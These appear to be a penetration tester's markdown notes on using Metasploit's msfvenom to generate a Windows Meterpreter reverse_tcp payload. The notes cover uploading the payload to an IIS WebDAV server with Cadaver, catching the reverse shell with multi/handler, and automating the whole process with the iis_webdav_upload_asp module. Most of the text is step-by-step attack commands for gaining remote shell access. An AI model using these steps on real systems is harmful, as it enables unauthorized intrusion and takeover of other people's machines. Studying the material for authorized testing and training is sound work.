# MSF Venom
* It is a Metasploit tool that generates a payload to get reverse shell access or remote access to a target system.
* `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[My IP not the target IP] LPORT=[Any port that could be free] -f [file type found suitable for the payload] > [write it down file name].[suitable extension]`
* Then move to Cadaver and "put" this shell file into the remote system.
* Before executing this payload by clciking on it, we need to add a listener/handler which will receive the reverse connection from the target system, and start a meterpreter session upon execution.
* To do this:
    * Start the DB as Metasploit framework requires Metasploit database to be started.
    * `service postgresql start && msfconsole`
    * `use multi/handler` (This acts as a listener provided by the Metasploit for the malicious payload that we have uploaded in the previous steps -->
    * `set payload windows/meterpreter/reverse_tcp` -->
    * `set LHOST=[My IP] and LPORT` --> (These values should be same as set up while writing the payload in the previous steps)
    * `exploit` --> This will launch a meterpreter session (but I have to click the shell.asp on the remote system to start the execution)
 
# Automate the process
* `use windows/iis/iis_webdav_upload_asp`
* `set httpusername [username]`
* `set httppassword [password]`
* I can also set RPORT as 443 if the SSL certificate is configured, and hence the SSL option as TRUE; Otherwise leave the RPORT to 80.
* `set PATH /webdav/[file_name which I want to upload as a payload].asp`

* **IMPORTANT**
  * Make sure to delete the payload from the remote system after exploitation part is over.
  * "windows/iis/iis_webdav_upload_asp" will delete that payload itself.
  * If payload is uploaded using some other technique, then CADAVER can be used to delete the payload--> `delete [filename]`
